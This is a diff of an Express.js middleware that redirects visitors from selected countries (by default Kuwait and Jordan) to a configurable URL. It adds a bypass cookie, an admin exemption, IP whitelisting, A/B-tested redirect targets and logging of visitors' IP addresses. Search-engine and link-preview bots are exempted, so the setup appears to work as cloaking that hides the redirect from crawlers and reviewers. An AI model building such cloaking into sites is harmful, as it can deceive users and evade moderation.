@@ -1,9 +1,6 @@
 import type { Request, Response, NextFunction } from "express";
 import { log } from "./index";
-
-const REDIRECT_URL = process.env.REDIRECT_URL || "https://google.com";
-
-const REDIRECT_COUNTRIES = ["KW", "JO"];
+import { storage } from "./storage";
 
 const GOOGLE_BOT_PATTERNS = [
   /googlebot/i,
@@ -27,6 +24,8 @@ const GOOGLE_BOT_PATTERNS = [
   /whatsapp/i,
   /telegrambot/i,
 ];
+
+const BYPASS_COOKIE_NAME = "geo_bypass";
 
 function isSearchBot(userAgent: string): boolean {
   if (!userAgent) return false;
@@ -119,12 +118,27 @@ async function getCountryFromIp(ip: string): Promise<string | null> {
   }
 }
 
+function hasBypassCookie(req: Request): boolean {
+  const cookies = req.headers.cookie;
+  if (!cookies) return false;
+  return cookies.includes(`${BYPASS_COOKIE_NAME}=true`);
+}
+
 export async function geoRedirectMiddleware(
   req: Request,
   res: Response,
   next: NextFunction
 ): Promise<void> {
   if (req.path.startsWith("/api") || req.path.startsWith("/@") || req.path.includes(".")) {
+    return next();
+  }
+  
+  if (req.path === "/admin") {
+    return next();
+  }
+  
+  if (hasBypassCookie(req)) {
+    log("Bypass cookie detected, skipping redirect", "geo");
     return next();
   }
   
@@ -136,16 +150,61 @@ export async function geoRedirectMiddleware(
   }
   
   const clientIp = getClientIp(req);
-  log(`Client IP: ${clientIp}`, "geo");
+  
+  const isWhitelisted = await storage.isIpWhitelisted(clientIp);
+  if (isWhitelisted) {
+    log(`Whitelisted IP: ${clientIp}`, "geo");
+    return next();
+  }
   
   const country = await getCountryFromIp(clientIp);
-  log(`Country detected: ${country || "unknown"}`, "geo");
   
-  if (country && REDIRECT_COUNTRIES.includes(country)) {
-    log(`Redirecting user from ${country} to ${REDIRECT_URL}`, "geo");
-    res.redirect(302, REDIRECT_URL);
+  const config = await storage.getGeoConfig();
+  if (!config || !config.isActive) {
+    await storage.logAnalytics({
+      ipAddress: clientIp,
+      countryCode: country,
+      wasRedirected: false,
+      userAgent: userAgent.substring(0, 500),
+    });
+    return next();
+  }
+  
+  const redirectCountries = config.redirectCountries || ["KW", "JO"];
+  
+  if (country && redirectCountries.includes(country)) {
+    let redirectUrl = config.redirectUrl;
+    let abVariant: string | undefined;
+    
+    const abTest = await storage.getActiveAbTest();
+    if (abTest) {
+      const randomValue = Math.random() * 100;
+      if (randomValue < abTest.trafficPercentage) {
+        redirectUrl = abTest.redirectUrl;
+        abVariant = abTest.name;
+        log(`A/B test: Using variant "${abTest.name}" for ${clientIp}`, "geo");
+      }
+    }
+    
+    await storage.logAnalytics({
+      ipAddress: clientIp,
+      countryCode: country,
+      wasRedirected: true,
+      userAgent: userAgent.substring(0, 500),
+      abVariant,
+    });
+    
+    log(`Redirecting user from ${country} to ${redirectUrl}`, "geo");
+    res.redirect(302, redirectUrl);
     return;
   }
+  
+  await storage.logAnalytics({
+    ipAddress: clientIp,
+    countryCode: country,
+    wasRedirected: false,
+    userAgent: userAgent.substring(0, 500),
+  });
   
   next();
 }
